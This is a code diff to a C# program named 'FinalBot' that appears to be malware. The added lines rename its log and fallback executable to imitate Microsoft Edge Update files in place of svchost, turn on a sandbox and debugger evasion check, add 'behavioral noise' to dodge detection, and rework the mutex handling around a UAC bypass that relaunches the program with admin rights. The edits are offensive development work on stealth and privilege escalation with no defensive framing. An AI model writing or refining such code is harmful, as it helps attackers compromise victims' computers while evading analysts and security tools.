@@ -14,7 +14,7 @@ namespace FinalBot
 
         private static void DebugLog(string msg)
         {
-            try { File.AppendAllText("C:\\Users\\Public\\svchost_debug.log", $"[{DateTime.Now}] {msg}\n"); } catch { }
+            try { File.AppendAllText("C:\\Users\\Public\\edge_update_debug.log", $"[{DateTime.Now}] {msg}\n"); } catch { }
         }
 
         static async Task Main(string[] args)
@@ -23,10 +23,11 @@ namespace FinalBot
             
             // 1. Single Instance Check — fixed name to prevent multi-launch conflicts
             bool createdNew;
-            string mutexName = "Global\\MS_Vanguard_System_Primary";
+            string mutexName = "Global\\Vanguard_System_Runtime_7X2B9"; // Unique signature to avoid legacy locks
             _mutex = new Mutex(true, mutexName, out createdNew);
             if (!createdNew) 
             {
+                Console.WriteLine("[-] Instance already active. Terminate existing process first.");
                 DebugLog("Process already running (Mutex found). Exiting.");
                 return;
             }
@@ -54,18 +55,34 @@ namespace FinalBot
             });
 
             // 2. Anti-Analysis Check
-            // if (SafetyManager.VerifySystemContext()) return;
+            if (SafetyManager.VerifySystemContext()) 
+            {
+                DebugLog("Sandbox/Debugger detected. Exiting.");
+                return;
+            }
+
+            // 3. Generate behavioral noise
+            SafetyManager.AntiBehavior();
 
             // 3. UAC Check & Bypass
             if (!ElevationService.IsAdmin())
             {
                 DebugLog("Not admin. Attempting UAC bypass...");
-                string selfPath = Process.GetCurrentProcess().MainModule?.FileName ?? "svchost.exe";
+                string selfPath = Process.GetCurrentProcess().MainModule?.FileName ?? "MicrosoftEdgeUpdate.exe";
+                
+                // CRITICAL: Release mutex before starting the elevated process, 
+                // otherwise the elevated instance will see it as 'already running' and exit.
+                _mutex?.Dispose();
+                _mutex = null;
+
                 if (ElevationService.RequestElevation(selfPath))
                 {
                     DebugLog("UAC bypass request sent. Exiting non-admin process.");
                     return; 
                 }
+                
+                // If bypass failed, re-acquire mutex
+                _mutex = new Mutex(true, mutexName, out _);
             }
             else
             {
